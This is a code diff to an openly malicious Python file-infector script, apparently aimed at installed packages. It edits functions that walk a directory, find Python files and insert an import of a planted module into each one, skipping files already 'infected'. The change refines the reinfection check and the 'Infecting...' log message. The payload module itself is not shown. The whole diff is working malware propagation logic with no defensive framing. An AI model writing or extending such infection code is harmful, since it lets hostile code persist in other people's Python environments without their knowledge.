@@ -92,7 +92,8 @@ def infect_file(file_path):
     with open(file_path, "r") as f:
         old_content = f.read()      # read the contents of the file into a string
     
-    if DEST_MODULE_NAME[:-3] in old_content:
+    search_str = "import " + DEST_MODULE_NAME[:-3]
+    if search_str in old_content:
         return      # return if it's already infected
 
     res = re.search('^import(.+?)\n', old_content)   # find the first import line
@@ -102,6 +103,7 @@ def infect_file(file_path):
         new_imp = current_imp + "\nimport " + DEST_MODULE_NAME[:-3]     
         new_con = old_content.replace(current_imp, new_imp, 1)     # insert the new import block
         with open(file_path, "w") as f:
+            print("Infecting " + file_path + "...")
             f.write(new_con)    # write the new content
 
     else:       # if there's no import block, just skip it, too much hassle
@@ -118,7 +120,6 @@ def infect(search_dir):
     # drop_module(mod_dest)   # write the module  DO THIS ELSEWHERE
     py_files = find_site(search_dir)  # find python
     for f in py_files:
-        print("Infecting " + f + "...")
         infect_file(f)      # hack em
     return
 
